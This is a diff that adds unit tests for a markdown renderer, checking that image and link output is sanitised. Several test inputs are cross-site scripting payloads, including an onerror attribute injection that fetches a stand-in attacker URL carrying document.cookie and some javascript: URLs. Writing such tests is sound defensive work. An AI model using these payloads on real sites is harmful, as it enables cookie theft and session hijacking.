@@ -808,3 +808,62 @@ Just some **bold** and *italic* text.
     assert library_requirements['requires_mathjax'] is False
     assert "<strong>bold</strong>" in html
     assert "<em>italic</em>" in html
+
+
+def test_img_escape():
+    text = "![\"onerror=\"alert(document.cookie)](http://example.com/notexisting.png)"
+    html, _, _ = render.markdown(text)
+    img_html = BeautifulSoup(html, "html.parser").find('img')
+    assert img_html
+    assert "onerror" not in img_html.attrs
+
+    md = "![\"onerror=\"fetch('https://example.com/?attacker='+document.cookie)](http://example.com/x.png)"
+    html, _, _ = render.markdown(md)
+    img_html = BeautifulSoup(html, "html.parser").find('img')
+    assert img_html
+    assert img_html.attrs.get("onerror", None) == None
+
+    text = "![](javascript:alert(document.cookie))"
+    html, _, _ = render.markdown(text)
+    img_html = BeautifulSoup(html, "html.parser").find('img')
+    assert img_html
+    assert img_html.attrs.get("src", None) == "#harmful-link"
+
+
+def test_link():
+    md = "[Some Text](http://example.com)"
+    html, _, _ = render.markdown(md)
+    a_html = BeautifulSoup(html, "html.parser").find('a')
+    assert a_html
+    assert a_html.attrs.get("href", None) == "http://example.com"
+    assert a_html.text == "Some Text"
+
+    md = "[](http://example.com)"
+    html, _, _ = render.markdown(md)
+    a_html = BeautifulSoup(html, "html.parser").find('a')
+    assert a_html
+    assert a_html.attrs.get("href", None) == "http://example.com"
+    assert a_html.text == "http://example.com"
+
+    md = "[Some Text](http://example.com \"With a title\")"
+    html, _, _ = render.markdown(md)
+    a_html = BeautifulSoup(html, "html.parser").find('a')
+    assert a_html
+    assert a_html.attrs.get("href", None) == "http://example.com"
+    assert a_html.attrs.get("title", None) == "With a title"
+
+    md = "[](http://example.com \"With a title\")"
+    html, _, _ = render.markdown(md)
+    a_html = BeautifulSoup(html, "html.parser").find('a')
+    assert a_html
+    assert a_html.attrs.get("href", None) == "http://example.com"
+    assert a_html.text == "http://example.com"
+    assert a_html.attrs.get("title", None) == "With a title"
+
+
+def test_link_escape():
+    md = "[click me](javascript:alert(document.cookie))"
+    html, _, _ = render.markdown(md)
+    a_html = BeautifulSoup(html, "html.parser").find('a')
+    assert a_html
+    assert a_html.attrs.get("href", None) == "#harmful-link"
